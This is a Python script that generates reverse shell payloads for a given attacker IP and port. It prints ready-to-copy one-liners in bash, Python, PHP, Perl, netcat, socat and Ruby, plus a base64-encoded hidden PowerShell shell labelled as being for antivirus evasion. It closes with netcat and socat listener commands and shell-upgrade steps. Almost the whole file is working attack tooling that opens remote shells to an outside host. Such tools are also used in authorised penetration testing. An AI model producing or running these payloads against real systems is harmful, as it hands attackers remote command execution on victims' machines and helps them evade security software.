#!/usr/bin/env python3
"""
payload-builder.py — Generate common reverse shell payloads with your IP/port
Usage: python3 payload-builder.py <LHOST> <LPORT>

Prints ready-to-copy payloads for bash, python, php, powershell, etc.
"""

import sys
import base64

def main():
    if len(sys.argv) < 3:
        print(f"Usage: python3 {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)

    lhost = sys.argv[1]
    lport = sys.argv[2]

    print(f"╔══════════════════════════════════════╗")
    print(f"║      payload-builder.py              ║")
    print(f"╚══════════════════════════════════════╝")
    print(f"LHOST: {lhost}  LPORT: {lport}")
    print()

    payloads = {
        "Bash -i": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Bash (URL-safe)": f"bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/{lhost}/{lport}%200>%261'",
        "Bash mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Python3": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
        "Python2": f"python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        "PHP exec": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"bash <&3 >&3 2>&3\");'",
        "PHP system": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});$proc=proc_open(\"bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
        "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\")}};'",
        "Netcat -e": f"nc -e /bin/bash {lhost} {lport}",
        "Netcat mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Socat": f"socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
        "Ruby": f"ruby -rsocket -e'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'",
    }

    # PowerShell (base64 encoded for AV evasion)
    ps_plain = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    ps_b64 = base64.b64encode(ps_plain.encode('utf-16-le')).decode()

    payloads["PowerShell"] = f"powershell -nop -w hidden -e {ps_b64}"
    payloads["PowerShell (plain)"] = ps_plain

    for name, payload in payloads.items():
        print(f"\033[0;36m── {name} ──\033[0m")
        print(f"  {payload}")
        print()

    # Listeners
    print(f"\033[1;33m── Start your listener ──\033[0m")
    print(f"  nc -lvnp {lport}")
    print(f"  rlwrap nc -lvnp {lport}")
    print(f"  socat file:`tty`,raw,echo=0 tcp-listen:{lport}")
    print()

    # Shell upgrade
    print(f"\033[1;33m── Upgrade to TTY ──\033[0m")
    print(f"  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print(f"  Ctrl+Z")
    print(f"  stty raw -echo; fg")
    print(f"  export TERM=xterm")
    print(f"  stty rows 40 cols 160")

if __name__ == '__main__':
    main()
